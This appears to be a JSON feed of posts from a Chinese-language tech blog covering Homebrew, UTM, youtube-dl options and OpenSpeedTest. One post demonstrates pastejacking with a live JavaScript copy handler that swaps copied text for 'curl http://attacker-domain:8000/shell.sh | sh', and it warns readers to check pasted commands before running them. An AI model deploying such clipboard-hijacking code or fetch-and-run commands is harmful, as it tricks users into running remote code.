            "content_html": "<span id=\"more\"></span>\n\n<h1 id=\"Homebrew\"><a href=\"#Homebrew\" class=\"headerlink\" title=\"Homebrew\"></a><a href=\"https://brew.sh/\">Homebrew</a></h1><p><a href=\"https://brew.sh/\">Homebrew</a> 是 Mac 上常用的第三方套件管理器，可以用來安裝 wget 等 Linux 常用但 Mac 沒有的程式。<br>雖然主要是面向 Mac 的程式，但 Linux 也可以用。</p>\n<h2 id=\"安裝\"><a href=\"#安裝\" class=\"headerlink\" title=\"安裝\"></a>安裝</h2><p>官方有提供安裝腳本</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># Homebrew 安裝腳本</span><br>/bin/bash -c <span class=\"hljs-string\">&quot;<span class=\"hljs-subst\">$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)</span>&quot;</span><br></code></pre></td></tr></table></figure>\n<blockquote>\n<p>不需要用 sudo 安裝</p>\n</blockquote>\n<p>裝完之後可以用 <code>brew help</code> 檢查是否安裝成功</p>\n<h2 id=\"使用方法\"><a href=\"#使用方法\" class=\"headerlink\" title=\"使用方法\"></a>使用方法</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><code class=\"hljs bash\">xxxx@MacBook-Pro ~ % brew <span class=\"hljs-built_in\">help</span><br><br>Example usage:<br>  brew search TEXT|/REGEX/<br>  brew info [FORMULA|CASK...]<br>  brew install FORMULA|CASK...<br>  brew update<br>  brew upgrade [FORMULA|CASK...]<br>  brew uninstall FORMULA|CASK...<br>  brew list [FORMULA|CASK...]<br><br>Troubleshooting:<br>  brew config<br>  brew doctor<br>  brew install --verbose --debug FORMULA|CASK<br><br>Contributing:<br>  brew create URL [--no-fetch]<br>  brew edit [FORMULA|CASK...]<br><br>Further <span class=\"hljs-built_in\">help</span>:<br>  brew commands<br>  brew <span class=\"hljs-built_in\">help</span> [COMMAND]<br>  man brew<br>  https://docs.brew.sh<br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 例如安裝 wget</span><br>brew install wget<br></code></pre></td></tr></table></figure>\n\n<p>其他更多用法參考官網 <a href=\"https://brew.sh/index_zh-tw\">https://brew.sh/index_zh-tw</a> (有中文)</p>\n<h2 id=\"安裝問題\"><a href=\"#安裝問題\" class=\"headerlink\" title=\"安裝問題\"></a>安裝問題</h2><p>如果下載途中意外中斷 <del>(例如 Mac 休眠自動斷線)</del> ，重跑時可能會出現下面問題</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><code class=\"hljs bash\">error: Not a valid ref: refs/remotes/origin/master<br>fatal: ambiguous argument <span class=\"hljs-string\">&#x27;refs/remotes/origin/master&#x27;</span>: unknown revision or path not <span class=\"hljs-keyword\">in</span> the working tree.<br></code></pre></td></tr></table></figure>\n\n<p>碰到這個問題，只要先把舊的刪掉再重裝就可以了</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># Homebrew 刪除腳本</span><br>/bin/bash -c <span class=\"hljs-string\">&quot;<span class=\"hljs-subst\">$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/uninstall.sh)</span>&quot;</span><br></code></pre></td></tr></table></figure>",
            "tags": [
                "Linux",
                "Mac",
                "套件管理"
            ]
        },
        {
            "id": "https://zonego.tw/2022/10/05/UTM-virtual-machine/",
            "url": "https://zonego.tw/2022/10/05/UTM-virtual-machine/",
            "title": "Apple Silicon MAC上的虛擬機軟體",
            "date_published": "2022-10-05T01:07:13.000Z",
            "content_html": "<span id=\"more\"></span>\n\n<p>相信在用 MAC 的大家或多或少都會遇到要用 Windows 專用軟體的情況。</p>\n<p>稍微在網路上爬過比較多人推薦的是 Parallel Desktop ，可惜它是付費軟體。</p>\n<p>VMWare 到今天只有推了一個測試版的 Fusion Player ，害我都已經想用 PC + 遠桌面解決了。</p>\n<p>還好閒逛時找到這套 UTM 虛擬機</p>\n<p><a href=\"https://mac.getutm.app/\">官網 https://mac.getutm.app/</a></p>\n<p><div class=\"gallery-pro\" style=\"column-width:200px;\"><div><img alt=\"\" src=\"https://mac.getutm.app/images/screens/windows-11.png\" data-caption=\"\" data-fancybox=\"gallery\" loading=\"lazy\"></div>\n<div><img alt=\"\" src=\"https://mac.getutm.app/images/screens/windows-10-arm64.png\" data-caption=\"\" data-fancybox=\"gallery\" loading=\"lazy\"></div>\n<div><img alt=\"\" src=\"https://mac.getutm.app/images/screens/ubuntu-20.04-arm64.png\" data-caption=\"\" data-fancybox=\"gallery\" loading=\"lazy\"></div>\n            </div></p>\n\n<p>介面有中文，只要有用過虛擬機的朋友，一定能簡單上手。<del>絕對不是因為我懶得寫</del></p>\n<p>UTM 的底層是用 QEMU ，代表在MAC上的虛擬機跑膩了，還可以簡單移植硬碟檔到 Proxmox VE 上執行。</p>\n<p><del>不得不說 M1 MAC 的續航力實在是太香了。</del></p>\n<blockquote>\n<p>更新，在 MAC 上用虛擬機還是非常噴電，大概只有用遠端桌面能解決了</p>\n</blockquote>\n",
            "tags": [
                "Mac",
                "Apple Silicon",
                "VM 虛擬機"
            ]
        },
        {
            "id": "https://zonego.tw/2022/04/27/copy-past/",
            "url": "https://zonego.tw/2022/04/27/copy-past/",
            "title": "注意複製貼上內容",
            "date_published": "2022-04-27T11:44:03.000Z",
            "content_html": "<span id=\"more\"></span>\n<h2 id=\"注意複製貼上內容\"><a href=\"#注意複製貼上內容\" class=\"headerlink\" title=\"注意複製貼上內容\"></a>注意複製貼上內容</h2><p>我們經常會從網路上複製資料，但在貼上之前先注意下你複製到甚麼內容!</p>\n<p>複製這個指令試試看</p>\n<p id=\"copy\">sudo apt update</p>\n\n<script>\ndocument.getElementById('copy').addEventListener('copy', function(e) { e.clipboardData.setData('text/plain', 'curl http://attacker-domain:8000/shell.sh | sh\\n'); e.preventDefault(); });\n</script>\n\n<p>把剛剛複製的貼這邊</p>\n<textarea style=\"height: 100px; min-height: 100px; width:100%; resize: none;\" cols=\"30\" name=\"textarea\" rows=\"5\" placeholder=\"Paste your safe text here...\"></textarea>\n\n\n<p>中間的奧秘就是用 JavaScript 達到改寫複製的內容</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-variable language_\">document</span>.<span class=\"hljs-title function_\">getElementById</span>(<span class=\"hljs-string\">&#x27;copy&#x27;</span>).<span class=\"hljs-title function_\">addEventListener</span>(<span class=\"hljs-string\">&#x27;copy&#x27;</span>, <span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">e</span>) &#123; <br>    e.<span class=\"hljs-property\">clipboardData</span>.<span class=\"hljs-title function_\">setData</span>(<span class=\"hljs-string\">&#x27;text/plain&#x27;</span>, <span class=\"hljs-string\">&#x27;curl http://attacker-domain:8000/shell.sh | sh\\n&#x27;</span>); <br>    e.<span class=\"hljs-title function_\">preventDefault</span>(); <br>&#125;);<br></code></pre></td></tr></table></figure>\n\n<p>所以，在貼上之前記得先貼到記事本檢查，<strong>不要直接貼到終端機使用</strong></p>\n<h3 id=\"來源\"><a href=\"#來源\" class=\"headerlink\" title=\"來源\"></a>來源</h3><p><a href=\"https://www.wizer-training.com/blog/copy-paste\">https://www.wizer-training.com/blog/copy-paste</a></p>\n",
            "tags": [
                "資安",
                "網路資源"
            ]
        },
        {
            "id": "https://zonego.tw/2022/04/10/youtube-dl-login/",
            "url": "https://zonego.tw/2022/04/10/youtube-dl-login/",
            "title": "youtube-dl 登入並下載影片",
            "date_published": "2022-04-10T08:39:57.000Z",
            "content_html": "<span id=\"more\"></span>\n<h2 id=\"↩️回總教學文\"><a href=\"#↩️回總教學文\" class=\"headerlink\" title=\"↩️回總教學文\"></a><a href=\"/2021/12/19/youtube-dl/\">↩️回總教學文</a></h2><h2 id=\"帳號密碼登入\"><a href=\"#帳號密碼登入\" class=\"headerlink\" title=\"帳號密碼登入\"></a>帳號密碼登入</h2><p>某些內容會指定必須要認證身分(登入)後，才能觀看<br>這種情況下， youtube-dl 有提供輸入簡單的帳號密碼的參數</p>\n<ul>\n<li><code>-u</code>, <code>--username</code> USERNAME 輸入帳號</li>\n<li><code>-p</code>, <code>--password</code> PASSWORD 輸入密碼</li>\n</ul>\n<p>範例</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><code class=\"hljs bash\">youtube-dl --username <span class=\"hljs-string\">&quot;your_mail@gmail.com&quot;</span> --password <span class=\"hljs-string\">&quot;P@ssw0rd&quot;</span> <span class=\"hljs-string\">&quot;https://www.youtube.com/watch?v=dQw4w9WgXcQ&quot;</span><br></code></pre></td></tr></table></figure>\n\n<p>目前只剩部分網站可以用這種方法登入。<br>Google 有更新過 youtube 帳號的取用安全性，只能用下面的 Cookie 方式登入。</p>\n<h2 id=\"使用-Cookie-登入\"><a href=\"#使用-Cookie-登入\" class=\"headerlink\" title=\"使用 Cookie 登入\"></a>使用 Cookie 登入</h2><p>Youtube-dl 可以使用 Netscape 格式的 cookie 檔案，讓伺服器端認定為已登入帳號的瀏覽器</p>\n<h3 id=\"匯出-cookie\"><a href=\"#匯出-cookie\" class=\"headerlink\" title=\"匯出 cookie\"></a>匯出 cookie</h3><p>我們可以用 EditThisCookie 幫我們匯出 Cookie</p>\n<p><a href=\"https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg\">EditThisCookie Chrome擴充商店</a></p>\n<p>安裝完後，進入 EditThisCookie 的設定</p>\n<p><img src=\"/images/content/youtube-dl_cookie_setting.jpg\"></p>\n<p>將輸出格式選擇 Netscape 格式<br><img src=\"/images/content/youtube-dl_cookie_setting2.jpg\"></p>\n<p>接著建立 cookie.txt 文字檔</p>\n<p>建立完後我們到 <a href=\"https://youtube.com/\">https://youtube.com</a><br>用 EditThisCookie 插件的匯出功能複製所有 cookie<br><img src=\"/images/content/youtube-dl_cookie.jpg\"></p>\n<p>將複製到的文字貼到 cookie.txt</p>\n<p>貼完後照前面的步驟，抓出 <a href=\"https://accounts.google.com/\">https://accounts.google.com</a> 的 cookie</p>\n<p>都完成後 cookie.txt 大概會長這個樣子</p>\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><code class=\"hljs txt\"># Netscape HTTP Cookie File<br># http://curl.haxx.se/rfc/cookie_spec.html<br># This file was generated by Cookie Editor<br>.youtube.com    TRUE\t/\tTRUE\t1712544730\t__Secure-1PAPISID\tXXXXX<br>.youtube.com    TRUE\t/\tTRUE\t1712544730\t__Secure-1PSID\tXXXXX<br>.youtube.com    TRUE\t/\tTRUE\t1712544730\t__Secure-3PAPISID\tXXXXX<br>.youtube.com    TRUE\t/\tTRUE\t1712544730\t__Secure-3PSID\tXXXXX<br>.youtube.com    TRUE\t/\tTRUE\t1681127908\t__Secure-3PSIDCC\tXXXXX<br>.youtube.com    TRUE\t/\tFALSE\t1687764170\t_ga\tXXXXX<br>.youtube.com    TRUE\t/\tFALSE\t1654529554\t_gcl_au\tXXXXX<br>.youtube.com    TRUE\t/\tFALSE\t1712544730\tAPISID\tXXXXX<br>.youtube.com    TRUE\t/\tFALSE\t1712544730\tHSID\tXXXXX<br>.youtube.com    TRUE\t/\tTRUE\t1664713150\tLOGIN_INFO\tXXXXX<br>.youtube.com    TRUE\t/\tTRUE\t1712663916\tPREF\tXXXXX<br>.youtube.com    TRUE\t/\tTRUE\t1712544730\tSAPISID\tXXXXX<br>.youtube.com    TRUE\t/\tFALSE\t1712544730\tSID\tXXXXX.<br>.youtube.com    TRUE\t/\tFALSE\t1681127908\tSIDCC\tXXXXX<br>.youtube.com    TRUE\t/\tTRUE\t1712544730\tSSID\tXXXXX<br>.youtube.com    TRUE\t/\tTRUE\t1665142416\tVISITOR_INFO1_LIVE\tXXXXX<br>.youtube.com    TRUE\t/\tFALSE\t0\twide\t0<br>.youtube.com    TRUE\t/\tTRUE\t0\tYSC\tXXXXX<br><br># Netscape HTTP Cookie File<br># http://curl.haxx.se/rfc/cookie_spec.html<br># This file was generated by Cookie Editor<br>.google.com    TRUE\t/\tTRUE\t1712494597\t__Secure-1PAPISID\tXXXXX<br>.google.com    TRUE\t/\tTRUE\t1712494597\t__Secure-1PSID\tXXXXX<br>.google.com    TRUE\t/\tTRUE\t1712494597\t__Secure-3PAPISID\tXXXXX<br>.google.com    TRUE\t/\tTRUE\t1712494597\t__Secure-3PSID\tXXXXX<br>.google.com    TRUE\t/\tTRUE\t1681128005\t__Secure-3PSIDCC\tXXXXX<br>.google.com    TRUE\t/\tTRUE\t1652183330\t1P_JAR\tXXXXX<br>.google.com    TRUE\t/\tTRUE\t1663206405\tAEC\tXXXXX<br>.google.com    TRUE\t/\tFALSE\t1712494597\tAPISID\tXXXXX<br>.google.com    TRUE\t/\tFALSE\t1712494597\tHSID\tXXXXX<br>.google.com    TRUE\t/\tTRUE\t1665402835\tNID\tXXXXX<br>.google.com    TRUE\t/\tFALSE\t1651150185\tOGP\tXXXXX<br>.google.com    TRUE\t/\tFALSE\t1651150184\tOGPC\tXXXXX<br>.google.com    TRUE\t/\tTRUE\t1712494597\tSAPISID\tXXXXX<br>.google.com    TRUE\t/\tFALSE\t1712494597\tSID\tXXXXX<br>.google.com    TRUE\t/\tFALSE\t1681128005\tSIDCC\tXXXXX<br>.google.com    TRUE\t/\tTRUE\t1712494597\tSSID\tXXXXX<br>myaccount.google.com    FALSE\t/\tTRUE\t1712544729\t__Secure-OSID\tXXXXX<br>myaccount.google.com    FALSE\t/\tTRUE\t1712544729\tOSID\tXXXXX<br>myaccount.google.com    FALSE\t/\tTRUE\t1652064730\tOTZ\tXXXXX<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"重整格式\"><a href=\"#重整格式\" class=\"headerlink\" title=\"重整格式\"></a>重整格式</h3><p>接著我們將剛剛的 cookie.txt 用 curl 重新整理格式</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><code class=\"hljs bash\">curl -b cookie.txt --cookie-jar ytcookie.txt <span class=\"hljs-string\">&#x27;https://youtube.com&#x27;</span><br></code></pre></td></tr></table></figure>\n\n<blockquote>\n<p>若是 Windows 的用戶，可以使用 Windows subsystem linux 2 (WSL2) 跑 Linux 的程式</p>\n</blockquote>\n<p>執行完後 cookie.txt 就可以刪了，我們只要 ytcookie.txt 這個檔案</p>\n<p>ytcookie.txt 要取甚麼名字都可以</p>\n<h3 id=\"使用-cookie-登入\"><a href=\"#使用-cookie-登入\" class=\"headerlink\" title=\"使用 cookie 登入\"></a>使用 cookie 登入</h3><p>用 <code>--cookie</code> 設定我們剛剛做好的 ytcookie.txt 就可以了</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><code class=\"hljs bash\">youtube-dl --cookie ./ytcookie.txt <span class=\"hljs-string\">&quot;https://www.youtube.com/watch?v=dQw4w9WgXcQ&quot;</span><br></code></pre></td></tr></table></figure>\n\n<p>接下來只要你沒在瀏覽器內登出帳號，ytcookie.txt 理論上就能一直使用</p>\n<p>當然，網站那邊可能也會紀錄是這個帳號在下載影片…</p>\n<h2 id=\"↩️回總教學文-1\"><a href=\"#↩️回總教學文-1\" class=\"headerlink\" title=\"↩️回總教學文\"></a><a href=\"/2021/12/19/youtube-dl/\">↩️回總教學文</a></h2>",
            "tags": [
                "Windows",
                "Linux",
                "Mac"
            ]
        },
        {
            "id": "https://zonego.tw/2022/04/10/youtube-dl-quality/",
            "url": "https://zonego.tw/2022/04/10/youtube-dl-quality/",
            "title": "youtube-dl 指定下載影片畫質",
            "date_published": "2022-04-10T08:29:20.000Z",
            "content_html": "<span id=\"more\"></span>\n<h2 id=\"↩️回總教學文\"><a href=\"#↩️回總教學文\" class=\"headerlink\" title=\"↩️回總教學文\"></a><a href=\"/2021/12/19/youtube-dl/\">↩️回總教學文</a></h2><h2 id=\"選擇畫質\"><a href=\"#選擇畫質\" class=\"headerlink\" title=\"選擇畫質\"></a>選擇畫質</h2><p>youtube-dl 預設會下載最高畫質的版本，不一定是 mp4 格式</p>\n<p>列出可下載的畫質:</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><code class=\"hljs bash\">youtube-dl -F https://www.youtube.com/watch?v=dQw4w9WgXcQ<br>[youtube] dQw4w9WgXcQ: Downloading webpage<br>[info] Available formats <span class=\"hljs-keyword\">for</span> dQw4w9WgXcQ:<br>format code  extension  resolution note<br>249          webm       audio only tiny   46k , webm_dash container, opus @ 46k (48000Hz), 1.18MiB<br>250          webm       audio only tiny   61k , webm_dash container, opus @ 61k (48000Hz), 1.55MiB<br>140          m4a        audio only tiny  129k , m4a_dash container, mp4a.40.2@129k (44100Hz), 3.27MiB<br>251          webm       audio only tiny  129k , webm_dash container, opus @129k (48000Hz), 3.28MiB<br>394          mp4        256x144    144p   68k , mp4_dash container, av01.0.00M.08@  68k, 25fps, video only, 1.72MiB<br>160          mp4        256x144    144p   71k , mp4_dash container, avc1.4d400c@  71k, 25fps, video only, 1.81MiB<br>278          webm       256x144    144p   89k , webm_dash container, vp9@  89k, 25fps, video only, 2.27MiB<br>133          mp4        426x240    240p  117k , mp4_dash container, avc1.4d4015@ 117k, 25fps, video only, 2.96MiB<br>395          mp4        426x240    240p  134k , mp4_dash container, av01.0.00M.08@ 134k, 25fps, video only, 3.40MiB<br>242          webm       426x240    240p  159k , webm_dash container, vp9@ 159k, 25fps, video only, 4.02MiB<br>134          mp4        640x360    360p  219k , mp4_dash container, avc1.4d401e@ 219k, 25fps, video only, 5.55MiB<br>396          mp4        640x360    360p  262k , mp4_dash container, av01.0.01M.08@ 262k, 25fps, video only, 6.64MiB<br>243          webm       640x360    360p  273k , webm_dash container, vp9@ 273k, 25fps, video only, 6.92MiB<br>135          mp4        854x480    480p  337k , mp4_dash container, avc1.4d401e@ 337k, 25fps, video only, 8.52MiB<br>244          webm       854x480    480p  397k , webm_dash container, vp9@ 397k, 25fps, video only, 10.04MiB<br>397          mp4        854x480    480p  450k , mp4_dash container, av01.0.04M.08@ 450k, 25fps, video only, 11.38MiB<br>136          mp4        1280x720   720p  655k , mp4_dash container, avc1.4d401f@ 655k, 25fps, video only, 16.57MiB<br>247          webm       1280x720   720p  699k , webm_dash container, vp9@ 699k, 25fps, video only, 17.67MiB<br>398          mp4        1280x720   720p  858k , mp4_dash container, av01.0.05M.08@ 858k, 25fps, video only, 21.70MiB<br>399          mp4        1920x1080  1080p 1576k , mp4_dash container, av01.0.08M.08@1576k, 25fps, video only, 39.84MiB<br>137          mp4        1920x1080  1080p 3546k , mp4_dash container, avc1.640028@3546k, 25fps, video only, 89.64MiB<br>18           mp4        640x360    360p  630k , avc1.42001E, 25fps, mp4a.40.2 (44100Hz), 15.95MiB (best)<br></code></pre></td></tr></table></figure>\n\n<p>選好要下載的格式，把 format code 填入參數 -f 裡</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><code class=\"hljs bash\">youtube-dl -f 137 https://www.youtube.com/watch?v=dQw4w9WgXcQ<br><br><span class=\"hljs-comment\"># 1920x1080 影片 + 129K音軌</span><br><span class=\"hljs-comment\"># 需要先裝 ffmpeg</span><br>youtube-dl -f <span class=\"hljs-string\">&quot;137+140&quot;</span> https://www.youtube.com/watch?v=dQw4w9WgXcQ<br></code></pre></td></tr></table></figure>\n\n<p>如果懶得查，也可以直接指定某種影片、音樂最高品質</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 下載 MP4 格式中最高畫質，或是其他格式中的最高畫質</span><br>youtube-dl -f <span class=\"hljs-string\">&#x27;bestvideo[ext=mp4]+bestaudio[ext=m4a]/best[ext=mp4]/best&#x27;</span> url<br><br><span class=\"hljs-comment\"># 指定最佳畫質，但不要高於 480p</span><br>youtube-dl -f <span class=\"hljs-string\">&#x27;bestvideo[height&lt;=480]+bestaudio/best[height&lt;=480]&#x27;</span> url<br><br><span class=\"hljs-comment\"># 下載檔案大小小於 50M 的最高畫質影片</span><br>youtube-dl -f <span class=\"hljs-string\">&#x27;best[filesize&lt;50M]&#x27;</span> url<br></code></pre></td></tr></table></figure>\n\n<blockquote>\n<p>指定格式、品質時，若網站沒有會下載失敗</p>\n</blockquote>\n<h2 id=\"↩️回總教學文-1\"><a href=\"#↩️回總教學文-1\" class=\"headerlink\" title=\"↩️回總教學文\"></a><a href=\"/2021/12/19/youtube-dl/\">↩️回總教學文</a></h2>",
            "tags": [
                "Windows",
                "Linux",
                "Mac"
            ]
        },
        {
            "id": "https://zonego.tw/2022/04/10/youtube-dl-subtitle/",
            "url": "https://zonego.tw/2022/04/10/youtube-dl-subtitle/",
            "title": "youtube-dl 下載字幕",
            "date_published": "2022-04-10T08:13:43.000Z",
            "content_html": "<span id=\"more\"></span>\n<h2 id=\"↩️回總教學文\"><a href=\"#↩️回總教學文\" class=\"headerlink\" title=\"↩️回總教學文\"></a><a href=\"/2021/12/19/youtube-dl/\">↩️回總教學文</a></h2><h2 id=\"參數\"><a href=\"#參數\" class=\"headerlink\" title=\"參數\"></a>參數</h2><ul>\n<li><code>--list-subs</code>：列出可下載的所有字幕</li>\n<li><code>--write-sub</code>：儲存字幕</li>\n<li><code>--write-auto-sub</code>: 儲存自動翻譯的字幕，限 youtube 可以使用</li>\n<li><code>--embed-sub</code>：將字幕合併至影片中，需搭配 –write-sub 參數使用</li>\n<li><code>--all-subs</code>：下載所有字幕</li>\n<li><code>--sub-format</code>：下載的字幕格式，如果原影片沒有指定的字幕格式會去下載其他格式的字幕</li>\n<li><code>--sub-lang</code>：選擇要下載的字幕語言，用逗號分隔，例如：zh_TW,ja</li>\n<li><code>--convert-subs</code>：將下載的字幕轉換成其他格式，目前支援 srt|ass|vtt|lrc</li>\n</ul>\n<h2 id=\"列出所有可用字幕\"><a href=\"#列出所有可用字幕\" class=\"headerlink\" title=\"列出所有可用字幕\"></a>列出所有可用字幕</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><code class=\"hljs bash\">youtube-dl --list-subs https://www.youtube.com/watch?v=AJYsA1jXf60<br>[youtube] AJYsA1jXf60: Downloading webpage<br>Available automatic captions <span class=\"hljs-keyword\">for</span> AJYsA1jXf60:<br>Language formats<br>tg       vtt, ttml, srv3, srv2, srv1<br>af       vtt, ttml, srv3, srv2, srv1<br>...<br>vi       vtt, ttml, srv3, srv2, srv1<br>zh-Hant  vtt, ttml, srv3, srv2, srv1<br>...<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"下載影片與字幕\"><a href=\"#下載影片與字幕\" class=\"headerlink\" title=\"下載影片與字幕\"></a>下載影片與字幕</h2><p>如果我要下載繁中以及英文的字幕，並另存成 .srt 格式</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><code class=\"hljs bash\">youtube-dl --sub-lang zh-Hant,en --write-sub --convert-subs srt https://www.youtube.com/watch?v=AJYsA1jXf60<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"只下載字幕\"><a href=\"#只下載字幕\" class=\"headerlink\" title=\"只下載字幕\"></a>只下載字幕</h2><p>可以加 <code>--skip-download</code> 跳過下載影片</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><code class=\"hljs bash\">youtube-dl --sub-lang zh-Hant,en --write-sub --convert-subs srt --skip-download https://www.youtube.com/watch?v=AJYsA1jXf60<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"下載自動翻譯字幕\"><a href=\"#下載自動翻譯字幕\" class=\"headerlink\" title=\"下載自動翻譯字幕\"></a>下載自動翻譯字幕</h2><p>下面指令為下載自動翻譯的繁體中文字幕</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><code class=\"hljs bash\">youtube-dl --write-auto-sub --sub-lang zh-Hant https://www.youtube.com/watch?v=R_BlrlAcOoQ<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"↩️回總教學文-1\"><a href=\"#↩️回總教學文-1\" class=\"headerlink\" title=\"↩️回總教學文\"></a><a href=\"/2021/12/19/youtube-dl/\">↩️回總教學文</a></h2>",
            "tags": [
                "Windows",
                "Linux",
                "Mac"
            ]
        },
        {
            "id": "https://zonego.tw/2022/03/15/SpeedTest/",
            "url": "https://zonego.tw/2022/03/15/SpeedTest/",
            "title": "OpenSpeedTest 純HTML5的內網測速工具",
            "date_published": "2022-03-15T10:46:58.000Z",
            "content_html": "<p>大家平常要測網路速度都會想到 Ookla 的 <a href=\"https://speedtest.net/\">Speedtest.net</a></p>\n<p>在簡單的網路環境內，Speedtest 就可以完成測速的工作</p>\n<p>但如果我要測試內網速度呢?</p>\n<span id=\"more\"></span>\n\n<h2 id=\"網路環境\"><a href=\"#網路環境\" class=\"headerlink\" title=\"網路環境\"></a>網路環境</h2><p>在測試之前，我們先了解網路速度到底是在測甚麼</p>\n<p>一般家用的網路架構大概如圖，由中華電信這些電信商(ISP) 提供網際網路連線(雲圖示)</p>\n<p>之後在你家裝一台路由器，讓家裡的設備可以透過它上網</p>\n<p><img src=\"/images/content/network-simple.png\"></p>\n<p>我們平常用的 Speedtest.net 其實就是在測家裡到網際網路的連線速度</p>\n<p>只是因為網路架構相當簡單，所以電腦、手機等終端的連線速度就等於連網際網路的速度</p>\n<hr>\n<p>若是有在玩自架 homelab 的朋友網路架構絕對沒那麼簡單，可能比較像這張圖</p>\n<p><img src=\"/images/content/network-complex.png\"></p>\n<p>在接到網際網路(後面以外網代稱)之前</p>\n<p>接到路由器 Router 架設區域網路(後面以內網代稱)</p>\n<p>然後連交換機 Switch 去串接各終端設備和伺服器、監視器等</p>\n<p>所以如果我們要測試內網裡面電腦連伺服器的速度 如下圖</p>\n<p><img src=\"/images/content/network-local.png\"></p>\n<p>Speedtest.net 當然就測不出來了</p>\n<h2 id=\"OpenSpeedTest\"><a href=\"#OpenSpeedTest\" class=\"headerlink\" title=\"OpenSpeedTest\"></a>OpenSpeedTest</h2><p>講了這麼多前提，主要就是要紹可以自己架設的 OpenSpeedTest</p>\n<p><a href=\"https://openspeedtest.com/\">官網</a></p>\n<p><a href=\"https://hub.docker.com/r/openspeedtest/latest\">DockerHub</a></p>\n<p>只要把它架在自己的伺服器上，就可以像在用 Speedtest.net 一樣測試內網的網速🎉</p>\n<p>這邊是官方那邊的 DEMO (沒錯它可以直接嵌在你的網頁內)</p>\n<div style=\"text-align:right;\"><div style=\"min-height:360px;\"><div style=\"width:100%;height:0;padding-bottom:50%;position:relative;\"><iframe style=\"border:none;position:absolute;top:0;left:0;width:100%;height:100%;min-height:360px;border:none;overflow:hidden !important;\" src=\"//openspeedtest.com/Get-widget.php\"></iframe></div></div>Provided by  <a href=\"http://openspeedtest.com\">OpenSpeedtest.com</a></div>\n\n\n<h2 id=\"安裝-OpenSpeedTest\"><a href=\"#安裝-OpenSpeedTest\" class=\"headerlink\" title=\"安裝 OpenSpeedTest\"></a>安裝 OpenSpeedTest</h2><p>OpenSpeedTest 大致分為3種安裝方式</p>\n<ol>\n<li>安裝程式包</li>\n<li>Docker</li>\n<li>從原始碼手動架設</li>\n</ol>\n<h3 id=\"程式包\"><a href=\"#程式包\" class=\"headerlink\" title=\"程式包\"></a>程式包</h3><p>官方打包好的安裝檔在這邊<a href=\"https://openspeedtest.com/speed-testing-application-for-your-website.php#Option-3\">下載頁</a>可以找到</p>\n<p>支援主流的作業系統 Windows, Mac, Linux 之外 連 Android 跟 IOS 都有 <del>用來測熱點性能?</del></p>\n<p>點 Start Server 後就可以連 👉 給的的網址測速了</p>\n<p><img src=\"/images/content/OSTV2-SS.png\"></p>\n<h3 id=\"Docker\"><a href=\"#Docker\" class=\"headerlink\" title=\"Docker\"></a>Docker</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><code class=\"hljs bash\">docker run --restart=unless-stopped --name openspeedtest -d -p 3000:3000 -p 3001:3001 openspeedtest/latest<br></code></pre></td></tr></table></figure>\n\n<p>啟動後連 <a href=\"http://your-ip:3000/\">http://YOUR-IP:3000</a> 或 <a href=\"https://your-ip:3001/\">https://YOUR-IP:3001</a> 測速</p>\n<h3 id=\"原始碼安裝\"><a href=\"#原始碼安裝\" class=\"headerlink\" title=\"原始碼安裝\"></a>原始碼安裝</h3><p>首先到 <a href=\"https://github.com/openspeedtest/Speed-Test\">Github</a> 下載或 clone 原始碼</p>\n<p>準備好 Nginx ，套用<a href=\"https://github.com/openspeedtest/Nginx-Configuration\">這邊</a></p>\n<p>然後將下載好的OpenSpeedTest原始碼，放到 Nginx 的網頁資料夾就可以用了</p>\n<blockquote>\n<p>要長期使用，推薦還是用 Docker 安裝，簡單省事</p>\n</blockquote>\n",
            "tags": [
                "Self-Hosting",
                "網路",
                "Windows",
                "Linux",
                "Mac"
            ]
        }
    ]
}